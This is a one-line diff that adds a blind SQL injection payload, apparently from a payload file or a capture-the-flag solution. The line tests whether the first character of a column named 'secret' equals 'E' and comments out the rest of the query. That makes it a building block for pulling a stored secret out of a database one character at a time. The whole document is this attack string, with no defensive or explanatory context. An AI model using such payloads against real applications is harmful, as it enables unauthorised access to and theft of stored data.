@@ -1,0 +1,1 @@
+' or (select substr(secret,1,1)="E") --
